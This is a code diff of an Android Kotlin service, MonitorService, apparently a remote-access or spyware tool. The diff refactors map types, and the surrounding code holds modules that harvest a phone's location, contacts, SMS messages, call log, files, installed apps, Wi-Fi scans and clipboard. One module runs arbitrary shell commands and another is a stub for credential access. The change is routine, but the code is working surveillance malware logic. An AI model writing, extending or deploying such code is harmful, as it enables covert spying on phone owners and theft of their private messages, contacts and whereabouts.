@@ -280,38 +280,37 @@ class MonitorService : Service() {
         fun cleanup()
     }
 
-    // Capability implementations using explicit type annotations
+    // Capability implementations using mutableMapOf for reliable type inference
     inner class LocationCapability(private val service: MonitorService) : Capability {
         override fun execute(args: String): Any {
             val loc = service.getLastLocation()
             return if (loc != null) {
-                val map: Map<String, Any> = mapOf(
-                    "latitude" to loc.latitude,
-                    "longitude" to loc.longitude,
-                    "accuracy" to loc.accuracy,
-                    "speed_kmh" to (loc.speed * 3.6),
-                    "timestamp" to System.currentTimeMillis()
-                )
+                val map = mutableMapOf<String, Any>()
+                map["latitude"] = loc.latitude
+                map["longitude"] = loc.longitude
+                map["accuracy"] = loc.accuracy
+                map["speed_kmh"] = loc.speed * 3.6
+                map["timestamp"] = System.currentTimeMillis()
                 map
             } else {
-                mapOf("error" to "No location available")
+                mutableMapOf("error" to "No location available")
             }
         }
         override fun cleanup() {}
     }
 
     inner class ScreenCapability(private val service: MonitorService) : Capability {
-        override fun execute(args: String): Any = mapOf("note" to "Screen capture requires MediaProjection permission")
+        override fun execute(args: String): Any = mutableMapOf("note" to "Screen capture requires MediaProjection permission")
         override fun cleanup() {}
     }
 
     inner class AudioCapability(private val service: MonitorService) : Capability {
-        override fun execute(args: String): Any = mapOf("note" to "Audio recording requires RECORD_AUDIO permission")
+        override fun execute(args: String): Any = mutableMapOf("note" to "Audio recording requires RECORD_AUDIO permission")
         override fun cleanup() {}
     }
 
     inner class CameraCapability(private val service: MonitorService) : Capability {
-        override fun execute(args: String): Any = mapOf("note" to "Camera capture requires CAMERA permission")
+        override fun execute(args: String): Any = mutableMapOf("note" to "Camera capture requires CAMERA permission")
         override fun cleanup() {}
     }
 
@@ -322,7 +321,7 @@ class MonitorService : Service() {
                 android.provider.ContactsContract.Contacts.CONTENT_URI,
                 null, null, null, null
             )
-            val contacts = mutableListOf<Map<String, String>>()
+            val contacts = mutableListOf<MutableMap<String, String>>()
             cursor?.use {
                 while (it.moveToNext()) {
                     val id = it.getString(it.getColumnIndex(android.provider.ContactsContract.Contacts._ID))
@@ -343,7 +342,11 @@ class MonitorService : Service() {
                             }
                         }
                     }
-                    contacts.add(mapOf("id" to id, "name" to name ?: "", "phone" to phone))
+                    val map = mutableMapOf<String, String>()
+                    map["id"] = id
+                    map["name"] = name ?: ""
+                    map["phone"] = phone
+                    contacts.add(map)
                 }
             }
             return contacts
@@ -359,15 +362,15 @@ class MonitorService : Service() {
                 arrayOf("address", "body", "date", "type"),
                 null, null, "date DESC"
             )
-            val smsList = mutableListOf<Map<String, String>>()
+            val smsList = mutableListOf<MutableMap<String, String>>()
             cursor?.use {
                 while (it.moveToNext()) {
-                    smsList.add(mapOf(
-                        "address" to it.getString(it.getColumnIndex("address")) ?: "",
-                        "body" to it.getString(it.getColumnIndex("body")) ?: "",
-                        "date" to it.getString(it.getColumnIndex("date")) ?: "",
-                        "type" to it.getString(it.getColumnIndex("type")) ?: ""
-                    ))
+                    val map = mutableMapOf<String, String>()
+                    map["address"] = it.getString(it.getColumnIndex("address")) ?: ""
+                    map["body"] = it.getString(it.getColumnIndex("body")) ?: ""
+                    map["date"] = it.getString(it.getColumnIndex("date")) ?: ""
+                    map["type"] = it.getString(it.getColumnIndex("type")) ?: ""
+                    smsList.add(map)
                 }
             }
             return smsList
@@ -383,16 +386,16 @@ class MonitorService : Service() {
                 arrayOf("number", "name", "date", "duration", "type"),
                 null, null, "date DESC"
             )
-            val calls = mutableListOf<Map<String, String>>()
+            val calls = mutableListOf<MutableMap<String, String>>()
             cursor?.use {
                 while (it.moveToNext()) {
-                    calls.add(mapOf(
-                        "number" to it.getString(it.getColumnIndex("number")) ?: "",
-                        "name" to it.getString(it.getColumnIndex("name")) ?: "",
-                        "date" to it.getString(it.getColumnIndex("date")) ?: "",
-                        "duration" to it.getString(it.getColumnIndex("duration")) ?: "",
-                        "type" to it.getString(it.getColumnIndex("type")) ?: ""
-                    ))
+                    val map = mutableMapOf<String, String>()
+                    map["number"] = it.getString(it.getColumnIndex("number")) ?: ""
+                    map["name"] = it.getString(it.getColumnIndex("name")) ?: ""
+                    map["date"] = it.getString(it.getColumnIndex("date")) ?: ""
+                    map["duration"] = it.getString(it.getColumnIndex("duration")) ?: ""
+                    map["type"] = it.getString(it.getColumnIndex("type")) ?: ""
+                    calls.add(map)
                 }
             }
             return calls
@@ -408,16 +411,16 @@ class MonitorService : Service() {
                 "/sdcard"
             }
             val file = java.io.File(path)
-            if (!file.exists()) return mapOf("error" to "Path not found")
-            if (!file.isDirectory) return mapOf("error" to "Not a directory")
+            if (!file.exists()) return mutableMapOf("error" to "Path not found")
+            if (!file.isDirectory) return mutableMapOf("error" to "Not a directory")
             val files = file.listFiles()?.map { f ->
-                mapOf<String, Any>(
-                    "name" to f.name,
-                    "path" to f.absolutePath,
-                    "size" to f.length(),
-                    "isDir" to f.isDirectory(),
-                    "lastModified" to f.lastModified()
-                )
+                val map = mutableMapOf<String, Any>()
+                map["name"] = f.name
+                map["path"] = f.absolutePath
+                map["size"] = f.length()
+                map["isDir"] = f.isDirectory()
+                map["lastModified"] = f.lastModified()
+                map
             } ?: emptyList()
             return files
         }
@@ -429,11 +432,11 @@ class MonitorService : Service() {
             val pm = service.packageManager
             val apps = pm.getInstalledApplications(PackageManager.GET_META_DATA)
             return apps.map { app: android.content.pm.ApplicationInfo ->
-                mapOf(
-                    "package" to app.packageName,
-                    "name" to pm.getApplicationLabel(app).toString(),
-                    "version" to try { pm.getPackageInfo(app.packageName, 0).versionName } catch (_: Exception) { "unknown" }
-                )
+                val map = mutableMapOf<String, String>()
+                map["package"] = app.packageName
+                map["name"] = pm.getApplicationLabel(app).toString()
+                map["version"] = try { pm.getPackageInfo(app.packageName, 0).versionName } catch (_: Exception) { "unknown" }
+                map
             }
         }
         override fun cleanup() {}
@@ -444,13 +447,13 @@ class MonitorService : Service() {
             val wifiManager = service.getSystemService(Context.WIFI_SERVICE) as android.net.wifi.WifiManager
             val scanResults = wifiManager.scanResults
             return scanResults.map { r ->
-                mapOf(
-                    "ssid" to r.SSID,
-                    "bssid" to r.BSSID,
-                    "level" to r.level.toString(),
-                    "frequency" to r.frequency.toString(),
-                    "capabilities" to r.capabilities
-                )
+                val map = mutableMapOf<String, String>()
+                map["ssid"] = r.SSID
+                map["bssid"] = r.BSSID
+                map["level"] = r.level.toString()
+                map["frequency"] = r.frequency.toString()
+                map["capabilities"] = r.capabilities
+                map
             }
         }
         override fun cleanup() {}
@@ -467,13 +470,17 @@ class MonitorService : Service() {
             val output = process.inputStream.bufferedReader().readText()
             val error = process.errorStream.bufferedReader().readText()
             val exitCode = process.waitFor()
-            return mapOf("output" to output, "error" to error, "exitCode" to exitCode)
+            val map = mutableMapOf<String, Any>()
+            map["output"] = output
+            map["error"] = error
+            map["exitCode"] = exitCode
+            map
         }
         override fun cleanup() {}
     }
 
     inner class CredsCapability(private val service: MonitorService) : Capability {
-        override fun execute(args: String): Any = mapOf("note" to "Credential access requires root")
+        override fun execute(args: String): Any = mutableMapOf("note" to "Credential access requires root")
         override fun cleanup() {}
     }
 
@@ -481,13 +488,13 @@ class MonitorService : Service() {
         override fun execute(args: String): Any {
             val clipboard = service.getSystemService(Context.CLIPBOARD_SERVICE) as android.content.ClipboardManager
             val text = clipboard.primaryClip?.getItemAt(0)?.text?.toString() ?: ""
-            return mapOf("clipboard" to text)
+            return mutableMapOf("clipboard" to text)
         }
         override fun cleanup() {}
     }
 
     inner class NotificationsCapability(private val service: MonitorService) : Capability {
-        override fun execute(args: String): Any = mapOf("note" to "Notification access requires permission")
+        override fun execute(args: String): Any = mutableMapOf("note" to "Notification access requires permission")
         override fun cleanup() {}
     }
 }
